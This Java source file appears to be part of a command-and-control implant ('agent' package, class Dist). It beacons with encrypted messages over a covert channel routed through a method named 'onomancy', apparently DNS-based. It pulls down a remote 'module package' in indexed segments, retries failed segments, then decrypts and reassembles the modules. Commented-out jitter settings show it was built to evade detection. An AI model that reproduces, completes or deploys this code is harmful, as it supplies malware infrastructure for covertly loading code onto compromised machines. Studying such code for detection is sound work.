package agent;

import java.lang.reflect.InvocationTargetException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Hashtable;
import java.util.concurrent.TimeUnit;

import javax.naming.NamingException;

public class Dist {
	//package management
	
	public static ArrayList<String> broker(String data, String cookie, String nonce) throws NoSuchAlgorithmException, ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
		String messageID = Util.strand(4);
		Hashtable svrParams = Netw.send("Kex",messageID,data,nonce);
		ArrayList<String> made = new ArrayList<String>(); 
		made.add(make(data,messageID,cookie));
		return made;
	}
	
	public static void finalize(String bufferKey) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException, NamingException {
		String nonce = Util.strand(12);
		String data = bufferKey + ".PBC"; 		
		ArrayList<String> made = broker(data, Crypt.bake(),nonce); 
		ArrayList nullified = Netw.onomancy(made);
	}
	
	public static Hashtable errorizer(Hashtable bufferDescriptor, int lastIndex) throws NoSuchAlgorithmException, NamingException, Exception {
		String nonce = Util.strand(12);
		Hashtable nextSegment = new Hashtable();
		String transmissionCode = ".PCR";
		nextSegment.put("error","none");
		int txCount = 0;
		int errorCondition = 0;
		while (txCount <= 10) {
			
			try {
				if (errorCondition != 0) {
					transmissionCode = ".PRR|" + Integer.toString(lastIndex);
				}
				String data = bufferDescriptor.get("bufferKey").toString() + transmissionCode; 
				ArrayList<String> made = broker(data,Crypt.bake(),nonce);
				nextSegment = receive(Netw.onomancy(made),nonce);
				errorCondition = 0;
				return nextSegment;
				
			} catch (Exception e) {
				errorCondition = 1;
			}
			txCount++;
		}
		nextSegment.put("error", "0x9320089104");
		return nextSegment;
		
	}
		
	public static Hashtable retrieve(Hashtable bufferDescriptor) throws NamingException, Exception {
		Double length = (Double) bufferDescriptor.get("bufferSize");
		int bufferSize = length.intValue();
		String[] packageBuffer = new String[bufferSize];
		int lastIndex = 0;
		
		while (true) {
			//get buffers based on buffer Descriptor
			
			Hashtable nextSegment = errorizer(bufferDescriptor, lastIndex);
			if (nextSegment.containsKey("error")) {
				return nextSegment;
			}
			
			Double index = (Double) nextSegment.get("index");
			int segmentIndex = index.intValue();
			//preserve the index for error handling
			lastIndex = segmentIndex;
			//int segmentIndex = Integer.parseInt(nextSegment.get("index").toString());
			
			if (segmentIndex == -1) {
				finalize(bufferDescriptor.get("bufferKey").toString());
				String joinedBuffer = String.join("", packageBuffer);
				return Util.tabify(joinedBuffer);
			} else {
				packageBuffer[segmentIndex] = nextSegment.get("data").toString();
			}
			//int jitterActual = Util.numrand((int) Main.config.get("jitterMin"), (int) Main.config.get("jitterMax"));
			//TimeUnit.MILLISECONDS.sleep(jitterActual);
		}
		
	}

	public static String parse(ArrayList<String> response, String nonce) throws Exception {
		String rebuilt = new String(Util.rebuild(response));
		//clean up the response
		//clean might be unnecessary
		//String cleanRebuilt = Util.clean(rebuilt);
		//convert raw array to hashtable
		String decryptedResponse = new String(Crypt.decrypt(Base64.getDecoder().decode(rebuilt), nonce.getBytes()));
		return decryptedResponse;
	}
	
	public static Hashtable receive(ArrayList<String> response, String nonce) throws Exception {
		String decryptedResponse = parse(response,nonce);
		Hashtable tabifiedResponse = Util.tabify(decryptedResponse);

		return tabifiedResponse;
	}
	
	
	public static String make(String data, String msgID, String cookie) {
		String compiled = "." + data + ".2." + msgID;
		return compiled;
	}
	
	public static Hashtable dispatch(String msgID, String data, String etc) throws Exception {
		String nonce = Util.strand(12);
		ArrayList<String> initializer = broker(data+"|PIR",etc,nonce);
		
		//return module package
		receive(Netw.onomancy(initializer),nonce);
		TimeUnit.MILLISECONDS.sleep(1000*5);
		ArrayList<String> made = broker(data,etc,nonce);
		Hashtable tabifiedDescriptor = receive(Netw.onomancy(made),nonce);
		return retrieve(tabifiedDescriptor);
	}
}
